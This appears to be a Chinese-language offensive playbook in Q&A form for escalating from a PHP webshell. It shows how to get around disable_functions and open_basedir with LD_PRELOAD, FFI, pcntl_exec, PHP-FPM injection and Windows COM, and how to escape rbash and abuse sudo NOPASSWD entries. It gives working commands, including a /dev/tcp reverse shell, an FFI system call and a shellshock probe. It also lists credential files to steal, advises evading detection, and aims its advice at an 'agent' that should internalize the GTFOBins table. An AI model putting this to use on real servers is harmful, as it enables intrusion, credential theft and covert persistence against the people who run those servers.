# 提权立足点 · disable_functions/受限执行绕过

### 拿到 webshell 第一件事:先摸清"我被关在什么笼子里"
**Q1**: 刚写入一个 PHP webshell,`system()` 一执行就报错或无回显,不确定是没权限还是被禁,该先做什么?
**A1**: 别急着找 EXP 猛试。先做一分钟"环境测绘":读 `phpinfo()`,拿不到就用 `ini_get_all()`/`ini_get('disable_functions')` 逐项打印。重点抓五样:`disable_functions` 名单、`open_basedir`、`safe_mode`(老版本)、PHP 版本、SAPI(fpm/cli/apache module/cgi)。判据:知道笼子形状才知道哪根栏杆松——命令执行被禁走执行原语替换,文件访问被限走读写路线,两者都禁走内存马/协议侧。
**Q2**: phpinfo 打不出、`ini_get` 也被过滤怎么办?
**A2**: 转"行为探测":逐个 `function_exists()` 检测一批候选(`exec/passthru/popen/proc_open/shell_exec/pcntl_exec/mail/imap_open/dl` 等),把"存在且未禁用"的列成白名单。这比读配置更真实,因为有些函数配置没禁但被 suhosin 或宿主策略拦。
**Q3**: 怎么快速判断哪些是"漏网"的可执行函数?
**A3**: disable_functions 是黑名单,总会有人漏。优先扫这些容易被忘的:`proc_open`、`popen`、`pcntl_exec`、`mail`/`mb_send_mail`(带 sendmail -X)、`imap_open`、`dl`、`putenv`+`mail`。命中任意一个,执行问题基本解决。
**Q4**: 全部命令执行函数都在黑名单里,一个不漏,怎么办(被墙转向)?
**A4**: 放弃"直接执行"这个维度,转向三条正交路线:(1) 文件读写路线——`file_put_contents`/`fopen` 写 crontab、写 SSH authorized_keys、写 web 目录别的脚本;(2) 内存/扩展路线——LD_PRELOAD 劫持、加载恶意 so、FFI;(3) 协议侧——找本机监听的其他服务(FastCGI、Redis、MySQL UDF)绕开 PHP 直接执行。
**Q5**: 怎么决定先走哪条正交路线?
**A5**: 看"最小依赖"。若 `putenv` 和任一能起子进程的函数(`mail`/`error_log`)还活着 → 先试 LD_PRELOAD,成本最低。若能写文件且知道 web 根 → 写别的语言脚本(Python/Perl CGI)。若本机 9000 端口开着 → FastCGI 路线。挑依赖最少那条先打。
**Q6**: 一条都不通,该收手还是继续?
**A6**: 记录已排除的维度(执行函数全禁、无 putenv、open_basedir 严、无本地服务),转去看"提权是否必要"——也许当前 www 权限已经能读到目标数据/配置/密钥,不必非要 shell。先复核任务目标再决定是否深挖。

### disable_functions 名单在手,怎么挑"漏网之鱼"
**Q1**: 我拿到了完整 disable_functions 名单,几十个函数,怎么系统性找出可用的执行原语?
**A1**: 把执行能力分四类逐类核对:(1) 直接命令类 `system/exec/passthru/shell_exec/popen/proc_open`;(2) 代码类 `pcntl_exec/pcntl_fork`;(3) 副作用类 `mail/mb_send_mail/imap_open/error_log/dl`;(4) 扩展/内存类 FFI、`putenv`+触发器。管理员通常只封第一类,后三类经常整片漏。
**Q2**: 名单里连 proc_open、popen 都封了,还有戏吗?
**A2**: 有。看 `pcntl_exec` 是否在名单外——它常被遗忘,而且能直接 execve,不经过 shell,一步到位。再看 `dl()` 能否动态加载扩展。
**Q3**: pcntl 系列在 fpm 环境常常没编译进去,怎么确认?
**A3**: `function_exists('pcntl_exec')` 返回 false 说明模块没装,不是被禁,此路天生不通,别浪费时间。转去看 `mail`/`imap_open` 这类"借力"函数。
**Q4**: mail 函数看着无害,它怎么能执行命令?
**A4**: 借 sendmail 路径。`putenv` 设 LD_PRELOAD 指向恶意 so,再调用 `mail()` 触发 fork/execve 加载 so 的 `__attribute__((constructor))`,命令在 so 加载瞬间执行。判据:`mail` 存在 + `putenv` 存在 + 能写 so 文件三者齐备即可。
**Q5**: putenv 也被禁了,LD_PRELOAD 这条断了怎么办(被墙转向)?
**A5**: 转 FFI 维度(PHP 7.4+):若 `ffi.enable` 非 disabled,用 FFI 直接 `cdef` 声明 `system`/`execve` 并调用,完全绕过 disable_functions,因为它走的是 C ABI 不是 PHP 函数表。
**Q6**: FFI 也关了、PHP 版本也低于 7.4,还能怎么转?
**A6**: 转"外部服务"正交维度:枚举本机 `127.0.0.1` 上的监听端口,找 FastCGI(9000)、Redis(6379)、MySQL——用 PHP 的 socket/fsockopen(这类很少被禁)直接跟它们对话触发执行。

### open_basedir 把我锁在 web 目录出不去
**Q1**: 命令能执行,但 `open_basedir` 限制我只能访问 web 目录,读不了 `/etc/passwd`,怎么破?
**A1**: 先分清:如果命令执行已通(system 可用),`open_basedir` 只限制 PHP 的文件函数,不限制子进程——直接 `system('cat /etc/passwd')` 就绕过了。判据:open_basedir 是 PHP 层的沙箱,子进程不继承这个限制。
**Q2**: 命令执行不通、只有 PHP 文件函数可用,怎么绕 open_basedir?
**A2**: 用经典 chdir + ini_set 组合:`mkdir` 建多层目录再逐级 `chdir('..')` 配合 `ini_set('open_basedir','..')` 逐步跳出,最后 `chdir('/')` 落到根,再重设 open_basedir 为空。这是纯 PHP 逻辑绕过,不需要命令执行。
**Q3**: chdir 绕过失败,可能是什么原因?
**A3**: 高版本 PHP 修补了部分路径逃逸,或 `ini_set` 对 open_basedir 只允许收紧不允许放宽。换 `glob://` 协议或 `DirectoryIterator`/`SplFileObject` 有时能列出限制外目录名(不读内容,先做侦察)。
**Q4**: 想读的具体文件路径不知道,只能列目录怎么办?
**A4**: 用 `glob://` 通配枚举结构,或利用报错回显——故意 include 一个不存在文件让 PHP 抛路径。先测绘目录树,定位配置文件/密钥再针对性读。
**Q5**: 所有 PHP 侧绕过都被高版本堵死了(被墙转向)?
**A5**: 转"能力升级"维度:既然 open_basedir 只是 PHP 沙箱,想办法获得一次命令执行就彻底摆脱它。回到 disable_functions 绕过路线(LD_PRELOAD/FFI/FastCGI),拿到子进程即自由。
**Q6**: 连命令执行都拿不到,只想读一个特定敏感文件?
**A6**: 转"绕道服务"维度:若本机有 MySQL 且当前 PHP 能连,用 `LOAD_FILE()` 或 `LOAD DATA` 读文件——MySQL 的文件权限独立于 open_basedir。或用 SSRF 打本机服务读文件。

### LD_PRELOAD 打了没反应,链路哪一环断了
**Q1**: 我 `putenv('LD_PRELOAD=/tmp/x.so')` 然后调 `mail()`,但命令没执行,怎么排障?
**A1**: 逐环验证。第一环:so 是否成功写入且路径可读(权限、open_basedir 是否挡了 /tmp)。第二环:so 是否编译成功、目标架构一致(x86/x64、glibc 版本)。第三环:触发函数是否真的 fork 了新进程。三环任一断都无回显。
**Q2**: 怎么确认 so 里的构造函数被调用了?
**A2**: 让 so 的 constructor 干一件"可观测"的事——写一个证据文件到可读目录、反弹一个连接、touch 一个文件。看到副作用才证明加载成功;没副作用说明根本没被加载。
**Q3**: mail 触发不起效,换什么触发器?
**A3**: 备选一堆:`error_log()` 走 sendmail 时也 fork、`mb_send_mail` 同源、`imap_mail`、以及任何间接调 `popen` 的函数(某些扩展函数会内部起进程)。挑一个未禁的换上试。
**Q4**: 目标是 Alpine 或者 musl 环境,glibc 的 so 加载不了,怎么办?
**A4**: 重新编译匹配目标 libc 的 so。先 `ldd /bin/sh` 或读 `/lib` 目录判断 libc 类型,针对性编译。Alpine 常用 musl,静态编译或用 musl-gcc 交叉编译。
**Q5**: mail 命令根本不存在(容器精简镜像没 sendmail),整条链断了(被墙转向)?
**A5**: 转"函数劫持"变体——不依赖 sendmail 的 LD_PRELOAD 玩法:找任何会被 PHP 主进程自己 `dlopen` 时触发的 hook 点(扩展加载)。或彻底转向 FFI/FastCGI/UDF 路线,LD_PRELOAD 不是唯一解。
**Q6**: SELinux/AppArmor 限制了 mmap/execstack,so 加载被内核拒绝怎么办?
**A6**: `dmesg` 或 audit 日志会有 avc denied 记录(有权限时)。硬绕不了策略,转 sanpshot 分析——SELinux 只拦特定 domain 的 fork/execmem,换个走内核系统调用的路径(如通过已存在的可信 daemon 触发)才有戏。或直接放弃 LD_PRELOAD,走进程内劫持(FFI 已加载的库函数)。

### mail 走不通时,把 LD_PRELOAD 触发器换到别处
**Q1**: putenv + LD_PRELOAD 组合可用,但 sendmail 不存在、mail 调用无子进程,怎么触发?
**A1**: 目标不是 mail 本身,是"让当前进程 fork/execve 一次子进程",子进程加载 libc 时才会读 LD_PRELOAD。凡是内部会 popen 或 exec 的 PHP 函数都算候选。判据:能观测到新进程 pid 出现即成功。
**Q2**: 具体有哪些"隐性触发器"?
**A2**: `error_log()` 在 message_type=1 时走 sendmail;`imap_open` 老版本会解析 mailbox 字符串起子进程(且历史上有命令注入 CVE);`gnupg_*` 家族起 gpg 子进程;`ImageMagick` 相关函数底层 delegate 起 convert 子进程(和 ImageTragick 是同一路)。
**Q3**: 目标只安装了 imagick 扩展,能用吗?
**A3**: 能。上传/加载一个畸形图片走 imagick 处理,或直接 `Imagick::__construct('epi:xxx')` 触发 delegate。整条路和 LD_PRELOAD 无关时,ImageTragick 本身就是 RCE。
**Q4**: 触发了但 LD_PRELOAD 环境变量没被子进程继承怎么办?
**A4**: 检查是否 setuid 二进制——glibc 对 setuid 程序会忽略 LD_PRELOAD(secure-execution 模式)。sendmail 常有 suid 属性。换非 setuid 的目标程序当触发器。
**Q5**: 所有触发器都试遍无效,再往哪转(被墙转向)?
**A5**: 换 `LD_LIBRARY_PATH` 劫持系统库依赖(改变已有 .so 的搜索优先级),或用 `GCONV_PATH`/`NLSPATH` 类环境变量劫持 glibc iconv/locale 加载路径——这些也是 LD_PRELOAD 家族的兄弟通道,同一原理不同变量。
**Q6**: putenv 允许但只允许特定前缀怎么办?
**A6**: PHP 的 `safe_mode_allowed_env_vars` 或 suhosin 会限制 putenv 前缀。逐个探测哪些前缀允许——LD_、GCONV_、NLS_ 中未必全封,找漏网的那个继续玩。

### FFI 未禁的一键秒杀路径
**Q1**: PHP 7.4+ 环境,ffi.enable 值未知,怎么判定并利用?
**A1**: 先 `ini_get('ffi.enable')`:值为 `true` 或 `1` 直接可用于任何脚本;值为 `preload` 则只能在预加载脚本用,一般打不了;`false`/`0` 则关闭。判据:字符串 true/1/on 都算开。
**Q2**: FFI 能干什么?
**A2**: 直接调 C 库函数——`FFI::cdef("int system(const char*);", "libc.so.6")->system("id")`。绕过整个 disable_functions,因为走的是 dlopen+dlsym,不查 PHP 函数表。
**Q3**: FFI 报错找不到 libc.so.6 怎么办?
**A3**: 换路径。用 `ldconfig -p | grep libc` 定位,或直接指定 `/lib/x86_64-linux-gnu/libc.so.6`(Debian/Ubuntu)或 `libc.musl-x86_64.so.1`(Alpine)。cdef 的第二参也可以省略让 FFI 从默认库找。
**Q4**: cdef 允许但 `FFI::load` 被限制怎么办?
**A4**: 用内联 cdef 即可,不需要 load 头文件。声明的原型只要签名对齐就能调用,`system/execve/fork/dlopen` 这几个签名简单直接手写。
**Q5**: FFI 完全禁用(preload 或 false),被墙转向哪里?
**A5**: 转"扩展加载"维度——若 `dl()` 未禁且 `enable_dl=On`,直接 `dl('恶意.so')` 加载自制扩展,扩展的 MINIT 里想干啥干啥。这是 FFI 的老前辈路径。
**Q6**: dl 也被禁了呢?
**A6**: 转"外部服务/内存马"维度——放弃在 PHP 进程内破笼子,走 FPM 直连/FastCGI 打自己/SSRF gopher 打 Redis UDF。整个"从 PHP 内破 PHP 沙箱"路线到此结束,换正交路线。

### imap_open 类扩展函数的历史命令注入
**Q1**: disable_functions 里没有 `imap_open`,PHP 也装了 imap 扩展,能直接利用吗?
**A1**: 看 PHP 版本。7.1.x 之前及部分 7.2/7.3 有已知的 imap_open 参数命令注入(mailbox 参数中通过 -oProxyCommand 或类似传参给 rsh/ssh 子进程)。判据:版本命中就有戏,不命中就当没这函数。
**Q2**: 怎么快速判定利用条件?
**A2**: 三件套:(1) `phpversion()` 落在漏洞区间;(2) `function_exists('imap_open')`;(3) `imap.enable_insecure_rsh` 通常需为 On(部分变种不需要)。三满足即可构造 payload。
**Q3**: 触发后没回显怎么办?
**A3**: imap_open 的注入结果一般不直接回显。让注入命令写文件到 web 目录或反弹连接,靠副作用观测——和 LD_PRELOAD 同思路。
**Q4**: 版本命中但打不通,怀疑发行版已回补丁?
**A4**: 许多发行版(Debian/Ubuntu/RHEL)会 backport 补丁而不改 phpversion 字符串。看 `phpinfo()` 里 "PHP Extension Build" 或包管理器版本号,或直接观测行为:发一个明显 payload 看是否被过滤。
**Q5**: 补丁已修,imap 路走不通,被墙转向?
**A5**: 转同类"扩展内命令注入"CVE 家族——历史上 `PHP-GD`、`ImageMagick delegate`、`Ghostscript delegate`、`ExifTool` 等都有过参数注入 RCE。看装了哪些扩展,针对性查 CVE。
**Q6**: 一个都没装,还想留在 PHP 层解决,可行吗?
**A6**: 已经很勉强了。承认 PHP 层无解,转 SAPI/中间件层——回到 LD_PRELOAD/FFI/FastCGI/UDF 那些正交路线。

### pcntl_exec 未禁的极简利用
**Q1**: 遍历发现 `pcntl_exec` 存在且未禁,怎么最快落地一个反弹 shell?
**A1**: 一句话 `pcntl_exec('/bin/bash', ['-c', 'bash -i >& /dev/tcp/A/P 0>&1'])`。它直接 execve 替换当前进程,不经过 shell 解析,反倒稳定。判据:调用成功后当前 PHP worker 会被替换掉,fpm 会自动拉新的,连接就到手。
**Q2**: 替换掉当前进程有什么副作用?
**A2**: HTTP 请求不会返回响应,连接会挂或 502。这在渗透里是可接受代价;若不想让 fpm 表现异常,先 `pcntl_fork` 再在子进程里 `pcntl_exec`。
**Q3**: 只有 pcntl_exec 但 pcntl_fork 被禁怎么办?
**A3**: 就接受当前进程被吞。或用 `pcntl_exec('/bin/sh', ['-c', 'nohup ... &'])` 让命令后台化,进程虽被替换但命令已 fork。
**Q4**: pcntl_exec 报错说 "not enabled" 但 function_exists 返回 true?
**A4**: fpm 模式下 pcntl 常被显式禁用,虽函数注册着但运行时拒绝。查 `phpinfo()` 里 pcntl 段落是否 "enabled"。真禁了就当作被墙。
**Q5**: 被墙转向哪里?
**A5**: pcntl_exec 死了不代表没戏,回到 `mail`/`imap_open`/`error_log` + LD_PRELOAD 的"借他人 fork"路线——不用自己 fork,借别人的。
**Q6**: 反弹回来的 shell 是 fpm 的 worker 权限(www-data)、还不够,怎么承接?
**A6**: 这是提权切入点,不是终点。立刻做本地信息收集(见后续 sudo -l/SUID/capabilities/内核版本链),同时上 tty 升级(见 tty 升级链),准备承接下一阶段本地提权。

### Apache CGI/mod_php + .htaccess 换 handler 绕过
**Q1**: 目标 Apache + mod_php,disable_functions 严,但 `AllowOverride All`,能写 `.htaccess` 到我的 web 目录,能玩什么?
**A1**: 改 handler。写一个 `.htaccess` 把某后缀重新映射到别的 CGI 处理器(如 `AddHandler cgi-script .xxx` 或 `SetHandler application/x-httpd-cgi`),然后上传对应的 CGI 脚本(Perl/Bash CGI)——完全绕过 PHP 沙箱,因为走的是另一条 handler 链。
**Q2**: mod_cgi 没启用怎么办?
**A2**: 检查 `Options ExecCGI`。没启则 CGI handler 不生效。转试 `AddType application/x-httpd-php .xxx` 找 PHP 别名后缀是否也被 disable_functions 管——绝大多数是同一 ini 全局管,这条不通。
**Q3**: 若能改 handler 到 PHP 但配合 `php_admin_value disable_functions ""`,能直接清空 disable_functions 吗?
**A3**: `php_admin_value` 只能在 httpd.conf/vhost 生效,不能在 .htaccess 生效。`.htaccess` 里只能 `php_value` 且不能覆盖 admin 类。这条通常打不通。
**Q4**: FPM 模式下 `.htaccess` 里的 php_value 完全无效,怎么办?
**A4**: FPM 不理会 .htaccess 的 php_value,因为 PHP 配置在 FPM 池里加载。这条路对 FPM 天生失效。转去看能否写 FPM 池配置(通常没权限)。
**Q5**: 无写 .htaccess 权限或被墙,被墙转向?
**A5**: 转"上传另一语言脚本"维度——如果 web 目录能写 .py/.pl/.cgi 且 Apache 有对应 handler 配置(常见于共享主机),直接跑另一门语言,PHP 沙箱一点都不管。
**Q6**: 全站只解析 PHP 且 handler 锁死,再无选择?
**A6**: 承认 handler 层无解,回到 LD_PRELOAD/FFI/FPM 直连正交路线。或转"污染现有 PHP 文件"——找已有的 include 逻辑写内存马把 disable_functions 用 ini_set 尝试放宽(admin 类改不了,但 ini_restore 有时能重置)。

### 本机 PHP-FPM 直连绕 disable_functions
**Q1**: fpm 监听在本机 9000 或 unix socket,当前 PHP 进程能连,为什么直连能绕 disable_functions?
**A1**: disable_functions 是每个 PHP 进程读自己的 php.ini 决定的。如果本机存在另一个 fpm 池(比如给别的站点用)ini 没那么严,直连它跑我们的 PHP 代码,就用另一份 disable_functions。判据:能拿到未禁 fpm 池就赢。
**Q2**: 只有一个 fpm 池,ini 一模一样,直连还有用吗?
**A2**: 有另一招:FastCGI 协议允许通过 `PHP_ADMIN_VALUE` 环境变量在请求粒度覆盖某些 ini 项。虽然 `disable_functions` 是 PHP_INI_SYSTEM 改不了,但 `open_basedir`、`auto_prepend_file` 可以——通过 `PHP_VALUE=auto_prepend_file=/proc/self/environ` 或指定任意本地文件当预加载脚本,直接触发文件包含 RCE。
**Q3**: fpm 端口本机不通、只有 unix socket 怎么办?
**A3**: 用 `stream_socket_client('unix:///path/to/fpm.sock')` 一样连。判据:找到 socket 路径(常见 /run/php/php-fpm.sock 或类似)后与 tcp 无差别。
**Q4**: fpm 有 listen.allowed_clients 或 security.limit_extensions 限制?
**A4**: `allowed_clients` 只对 tcp 生效,unix socket 靠文件权限。若 socket 属 www-data 组我们能读写,直接连。`security.limit_extensions` 限制只有 .php 才处理——用 `auto_prepend_file` 指向任意路径,再请求一个存在的 .php 触发。
**Q5**: FPM 完全没起、只有 mod_php,被墙转向?
**A5**: 换正交路线:回到 LD_PRELOAD/FFI/UDF。或找本机其他解释器服务(Node、Python WSGI 走 socket)。
**Q6**: FPM 通了但请求返回空/超时怎么排障?
**A6**: FastCGI 协议报文构造错(常见 SCRIPT_FILENAME 路径不存在、CONTENT_LENGTH 不一致)。用现成的 fpm 客户端库或对照协议逐字节校验;或让日志侧告诉你——先请求一个已知存在的 .php 确认协议通,再叠加 auto_prepend_file。

### Windows 上 PHP 的 disable_functions - COM 通道
**Q1**: 目标是 Windows + PHP,disable_functions 常见函数全封,还有什么 Windows 特有招数?
**A1**: 看 `com_dotnet` 扩展是否启用。若 `class_exists('COM')` 为 true,可以直接 `new COM("WScript.Shell")->exec("cmd /c ...")`——走 COM 对象出去,不查 disable_functions。判据:CLI 里 COM 默认关,fpm/apache 常启用,可直接测。
**Q2**: WScript.Shell 被 EDR 拦怎么办?
**A2**: 换 COM 对象:`Shell.Application`、`MSScriptControl.ScriptControl`(需装 Windows Script)、`InternetExplorer.Application`(老系统)。或走 WMI:`new COM("winmgmts://")` 调 `Win32_Process::Create`。
**Q3**: com_dotnet 也没启用,还剩什么招?
**A3**: 检查 `.NET` COM——`DOTNET` 类(需 com_dotnet 扩展)能实例化 .NET assembly,直接跑 C# 代码。或看 Windows 特有函数如 `w32api_register_function`(老扩展,罕见)。
**Q4**: 全部 Windows COM 路线断,LD_PRELOAD 又是 Linux 专属,被墙转向?
**A4**: 转"FPM 直连"或"文件写入"——Windows 上写计划任务(schtasks)需要命令执行,但写启动目录 .lnk 或 .bat 只需要文件写入权限;或写 IIS handler mapping(web.config)启用 CGI/ISAPI 引入别的解释器。
**Q5**: Windows 上等同 LD_PRELOAD 的思路存不存在?
**A5**: 存在但更难——`AppInit_DLLs` 注册表键、DLL 侧加载。都需要注册表写权限或系统目录写权限,PHP 沙箱内很难做到。
**Q6**: 只想拿数据,是不是必须提权?
**A6**: Windows 环境下 IIS AppPool 身份常有较宽读权限,先枚举 `whoami /priv`、访问 `inetpub`/日志/web.config——很多时候不用提权就够拿目标。

### dl() 动态加载扩展绕过
**Q1**: 看到 `dl` 未在 disable_functions 里,能直接 `dl('恶意.so')` 吗?
**A1**: 还得看 `ini_get('enable_dl')`。老 PHP 默认 On,新版本或 fpm 通常 Off。都得两个条件同时满足才行。
**Q2**: enable_dl=On 但 dl 只允许从 extension_dir 加载怎么办?
**A2**: 读 `ini_get('extension_dir')` 拿到路径。若能写(通常权限不够),扔一个自制扩展进去;不能写就转下一路。
**Q3**: 自制扩展怎么最省事?
**A3**: 写一个最小 zend_module_entry,MINIT 里 system() 一下就完事,不需要注册任何 PHP 函数——加载即执行。GCC 交叉编译到目标架构和 PHP 版本匹配的 API 号。
**Q4**: PHP 版本不知道 API 号,盲编译加载失败率高怎么办?
**A4**: 先 `phpversion()`+`PHP_ZTS`+`ZEND_MODULE_API_NO` 探测,写脚本读 `get_loaded_extensions()` 中已装扩展的 header 反推。或用现成的 fuzz 化 extension——多 API 版本预编译一批(不同 PHP 版本对应不同 so)选匹配的。
**Q5**: dl 拒绝加载(签名/白名单)、被墙转向?
**A5**: 转 FFI 或 LD_PRELOAD——它们不走 PHP 扩展加载路径,不受 dl 限制。或转 FPM 直连。
**Q6**: 一切扩展类路线都断,只剩文件读写,还能做什么?
**A6**: 写 crontab / SSH authorized_keys / sudoers.d 里合法子文件(常无权),或找 web 服务读取的配置文件下毒——通常已能拿到静态凭据、密钥、db 连接字符串,不需要 shell。

### PHP GC UAF / 内存破坏 exp 何时上
**Q1**: 什么情况下考虑 PHP 内存破坏漏洞(如 GC UAF 类)绕 disable_functions?
**A1**: 绝对最后一步。前提是没写文件权限、无扩展加载、无 FFI、无 FPM 直连,并且 PHP 版本命中已知 exp 且允许运行任意 PHP 代码。判据:成本高、稳定性差、不同 opcache 状态影响大。
**Q2**: 为什么这类 exp 不作为首选?
**A2**: 多数依赖具体 PHP 版本、ZTS/NTS、opcache、内存分配器状态,失败率高,失败后可能让 fpm worker crash 引发告警。绕过路径能走别的就别用它。
**Q3**: 决定要用了,怎么降低风险?
**A3**: 先用 `pcntl_fork`(若可用)在子进程里跑 exp,worker 崩就崩不影响主。或找一次性 request 完就退出的场景。执行前先测绘 PHP 版本、opcache 是否开、jit 是否启,选对应变体。
**Q4**: 打了几次都 SIGSEGV 没成功,继续还是撤?
**A4**: 撤。SIGSEGV 会进日志,连续 crash 是最强 IoC。改回搜有没有漏掉的路径(重新枚举 function_exists、重新看 ini_get_all 找 `open_basedir`/`ffi.enable`/`disable_functions` 是否被误读)。
**Q5**: 目标 opcache 开且预编译,exp 打不了,被墙转向?
**A5**: 承认此路封死,回到"承接现状"——放弃提权到 root,用当前 PHP 权限做深度信息收集(读所有能读的、试连本地服务)。
**Q6**: 如果 exp 成功,后续要不要清理?
**A6**: 清理已污染的 opcache 项、避免留下调试打印。exp 成功往往内存已破坏,后续同 worker 上再跑正常代码可能不稳,做完一次持久化就换新 worker。

### 只能读文件、无法执行时的情报收集转向
**Q1**: PHP 沙箱严到彻底没戏,只有 `file_get_contents`/`include` 之类文件读能力,该转向做什么?
**A1**: 承认执行维度封死,把当前立足点当成"读原语"最大化利用。目标切换为"用读文件的能力拿数据"而不是"必须拿到 shell"。判据:很多任务(拿凭据、config、db 数据)不需要 root。
**Q2**: 应该按什么优先级读文件?
**A2**: 由高到低:(1) 应用配置(.env、config/database.php、settings.py、application.yml)拿 DB/云凭据;(2) 私钥(~/.ssh/id_rsa、/etc/ssl/private);(3) 历史命令(~/.bash_history、~/.mysql_history);(4) 系统凭据(/etc/shadow 若有权、/var/lib/mysql/mysql/user.MYD)。
**Q3**: open_basedir 只让读 web 目录怎么办?
**A3**: 先用之前的 chdir/glob 绕过路线扩范围。若绕不出去,只读 web 内的 config——现代应用配置里几乎必含 DB 凭据和 API key,单点就够横向。
**Q4**: 读到 DB 凭据但外网不通,能干什么?
**A4**: 用 PHP 直连 DB(`mysqli`/`pgsql` 通常不禁),查敏感表——用户表、订单、密钥表。DB 常有 admin hash 直接横向到应用层管理员。
**Q5**: 所有配置读了都是空/加密,被墙转向?
**A5**: 转"运行时内存"——读 `/proc/self/environ` 拿当前进程环境变量(常含密钥),读 `/proc/*/cmdline` 拿其他进程启动参数(常泄密码),读 `/proc/net/tcp` 摸内网连接图。这些在只读维度里价值最高。
**Q6**: /proc 也被 open_basedir 挡?
**A6**: /proc 是虚拟 fs,open_basedir 是路径前缀匹配,若允许了 `/proc/self` 就能读一部分。若彻底挡住,承认信息收集也到顶,报告已收集内容让 agent 决定横向还是收工。

### shellshock 类 CGI 环境变量注入
**Q1**: 目标是 CGI 模式(不是 fpm/mod_php),User-Agent 塞入 payload 就执行,是什么情况?
**A1**: shellshock 家族(CVE-2014-6271 及变种)。CGI 把 HTTP 头写进环境变量,bash 解析函数定义时执行了尾部命令。判据:目标 bash 版本旧(4.3 以前未修)且 CGI handler 是 bash 脚本或调用 bash 的 perl/php CGI。
**Q2**: 怎么快速判定目标可打?
**A2**: 探测标志 `() { :;}; echo x` 塞 User-Agent 看响应或日志。响应体或响应头出现 `x` 说明命中。判据:任何返回包里出现原始注入字符串的回显即中。
**Q3**: 命中了但只回显 echo,没拿到 shell?
**A3**: 换命令为反弹或写 authorized_keys。shellshock 直接是 root(如果 CGI 以 root 跑)或 apache 用户,拿到手立刻横向。
**Q4**: bash 已经补丁但 CGI 仍在,还有别的招吗?
**A4**: 看是否 perl/python CGI 有 command injection 参数或环境变量。CGI 这个古老架构历史上一堆参数注入案例——先抓 URL 参数、Cookie、UA 逐个测。
**Q5**: shellshock/CGI 都无戏,被墙转向?
**A5**: 转正常 web 漏洞维度——CGI 应用往往老,SQLi/文件包含/反序列化面更大。CGI 是提示"这台目标很老",全站扫应用层漏洞回报更高。
**Q6**: 打通了但落地的 shell 无 tty,怎么承接?
**A6**: 见 tty 升级链。CGI 反弹的 shell 天生没 tty,立刻 python -c pty.spawn 或 script /dev/null 起 pty,不然 sudo/su 都用不了。

### rbash / lshell 类受限 shell 逃逸
**Q1**: SSH 或 su 进去发现是 rbash(限制版 bash),很多命令用不了,怎么逃?
**A1**: 先摸清限制类型。rbash 常见限制:不能 cd、不能改 PATH、不能重定向、不能带 / 的命令。用 `echo *`、`compgen -c` 列出可用命令,用 `which -a` 探索。判据:找到一个可执行且能起子 shell 的命令就够。
**Q2**: 有 vi/vim 可用,怎么逃?
**A2**: 经典 `:set shell=/bin/sh` 然后 `:shell`,或 `:!sh`。vi 起的子 shell 不继承 rbash 限制。同类 less/more 输入 `!sh`。GTFObins 上有完整清单。
**Q3**: 只有几个白名单命令,没有 vi/less/find/awk 这类"多才多艺"的?
**A3**: 找有 -exec 或 lua/python 内嵌的:tar --checkpoint-action、find -exec、awk BEGIN system()、python -c、perl -e、gdb 甚至 nmap --interactive(老版本)。任何允许调子进程或加载脚本的都能逃。
**Q4**: 白名单严到没有可利用命令,怎么办?
**A4**: 攻 SSH 参数——重连时用 `ssh user@host -t 'bash --noprofile --norc'` 或用 `-o ProxyCommand` 之类,rbash 是在 shell 起来后限制,能否指定另一个启动命令绕过看 sshd 的 ForceCommand 配置。
**Q5**: ForceCommand 锁死无法换 shell,被墙转向?
**A5**: 转"文件"维度——若 SFTP 未禁,能读写用户目录,直接改 `~/.bashrc`/`~/.profile`/`~/.ssh/rc`,下次登录时会以正常 bash 执行(部分 rbash 配置下次登录仍受限,但注入脚本在 shell 起来前跑一次就够)。
**Q6**: SFTP 也禁,一切封死怎么办?
**A6**: 承认这个账户维度封死,回到"这个账户能做什么"——rbash 常给运维只读账户,专用来看日志/跑指定报表,想想任务是不是这类信息就能达成。

### sudo -l 有 NOPASSWD 项 - GTFObins 思路
**Q1**: 跑 `sudo -l` 看到几个 NOPASSWD 允许的命令,怎么系统性判断哪个能提权?
**A1**: 逐个丢进 GTFObins 心里查表(agent 应内建这份表格的模式)。核心问题:命令能否被诱导做以下之一——起子 shell、读任意文件(以 root 权限)、写任意文件、加载任意共享库。命中任一即提权可行。
**Q2**: 命令有 GTFObins 记录但需要交互(如 vim :shell),SSH 反弹 shell 无 tty 怎么办?
**A2**: 先升级 tty(python pty.spawn + stty raw + 手动设 rows/cols),再走交互路径。这是 sudo 提权的常见坑。
**Q3**: 命令是自定义脚本(如 `/opt/tool/run.sh`),GTFObins 没有,怎么分析?
**A3**: 读脚本(可能 root 才能读,先看权限)。找注入点:是否调用 shell 且拼接了参数、是否 source 了可写文件、是否 exec 了 PATH 可控命令。每个都是提权向量。
**Q4**: 命令看似安全(如 sudo /bin/cat 只让读文件),真的没戏?
**A4**: 有戏。/bin/cat 以 root 读 /etc/shadow → 离线破 hash。/bin/tar 以 root 读任意文件 → 一样。GTFObins 的 "File read" 类别就是这个用途,即使不能起 shell 也能横向。
**Q5**: 命令有参数白名单校验(不能传 -exec 之类),被墙转向?
**A5**: 攻校验本身——看是不是简单 grep -v -e "危险参数",能否通过环境变量、别名、脚本 wrapper 绕。或看 sudoers 是否用了 wildcard(`sudo /bin/cmd *`),wildcard 常允许把参数拼到别的选项里。
**Q6**: 一条 NOPASSWD 都无戏,再往哪转?
**A6**: 转 SUID/capabilities/cron/kernel exp 正交路线。sudo 只是 Linux 提权的一条线,不是唯一。

### NOPASSWD 命令严格但可传参 - 环境变量/参数注入
**Q1**: sudoers 里有 `NOPASSWD: /usr/bin/prog arg1 arg2 *`,末尾 wildcard 允许追加参数,怎么利用?
**A1**: 看 prog 的参数解析。追加 `--config=/attacker.conf` 或 `-o loadmodule=/attacker.so` 类选项若被解析就控制行为。或追加 shell 元字符——sudo 本身不解析 shell 但 wildcard 有时被 shell 展开成多个参数,含义变化。
**Q2**: sudoers 用 `env_keep+=` 或 `Defaults !env_reset`,能通过环境变量提权吗?
**A2**: 能。若 LD_PRELOAD/LD_LIBRARY_PATH/PYTHONPATH/PERL5LIB 在 env_keep 里,被允许命令用这些语言写就直接接管。判据:`sudo -l` 输出的 env 段落里能看到 keep 项。
**Q3**: 命令是 shell 脚本且用了相对路径调子命令,PATH 保留吗?
**A3**: 若 PATH 在 env_keep 里(或 secure_path 没设),写同名恶意命令到当前 PATH 前置目录,以 root 执行。这是老套 PATH 劫持。
**Q4**: `secure_path` 已设、env_reset 严,怎么办?
**A4**: 转 wildcard 参数注入——找已允许命令是否有 `-i include`、`-e exec`、`-p pluginfile`、`--load` 类可加载外部代码的选项。GTFObins 里几乎所有可写脚本语言解释器都有。
